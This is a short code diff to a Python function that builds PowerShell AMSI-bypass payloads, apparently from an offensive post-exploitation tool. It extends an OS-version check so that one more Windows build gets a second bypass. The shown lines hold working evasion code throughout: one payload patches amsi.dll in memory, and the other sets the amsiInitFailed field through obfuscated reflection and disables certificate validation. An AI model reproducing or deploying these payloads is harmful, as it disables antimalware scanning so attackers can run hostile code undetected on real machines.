@@ -74,7 +74,7 @@ def create_amsi_bypass(server_os):
     
     amsi_bypass="""$kk='using System;using System.Runtime.InteropServices;public class kk {[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string lpLibFileName);[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress,UIntPtr dwSize,uint flNewProtect,out uint lpflOldProtect);}';Add-Type $kk;$oldProtectionBuffer=0;[IntPtr]$address=[IntPtr]::Add([kk]::GetProcAddress([kk]::LoadLibrary("amsi.dll"),"DllCanUnloadNow"),2000);[kk]::VirtualProtect($address, [uint32]2, 4, [ref]$oldProtectionBuffer)|Out-Null;[System.Runtime.InteropServices.Marshal]::Copy([byte[]] (0x31,0xC0,0xC3),0,$address,3);[kk]::VirtualProtect($address,[uint32]2,$oldProtectionBuffer,[ref]$oldProtectionBuffer)|Out-Null;"""
 
-    if "2012" in server_os or "7601" in server_os: 
+    if "2012" in server_os or "7601" in server_os or "6003" in server_os: 
         amsi_bypass = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
 try{
 [Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Aut'+'omation.Am'+'siUt'+'ils').GetField('am'+'siIni'+'tFailed', 'NonP'+'ublic,Sta'+'tic').SetValue($null, $true)
